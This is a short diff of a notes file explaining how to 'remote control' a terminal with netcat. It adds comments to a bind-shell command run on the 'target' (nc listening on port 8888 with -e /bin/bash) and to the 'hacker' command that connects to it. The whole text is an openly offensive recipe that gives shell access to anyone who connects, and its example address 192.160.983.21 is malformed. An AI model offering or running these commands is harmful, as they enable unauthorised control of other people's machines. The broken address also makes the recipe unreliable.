@@ -1,7 +1,7 @@
 # Netcat can remote control terminal
 
 # Target computer
-nc -l -p 8888 -e /bin/bash
+nc -l -p 8888 -e /bin/bash     # You need to run this command first
 
 # Hacker
-nc 192.160.983.21 8888
+nc 192.160.983.21 8888      # This ip addr is target ip addr
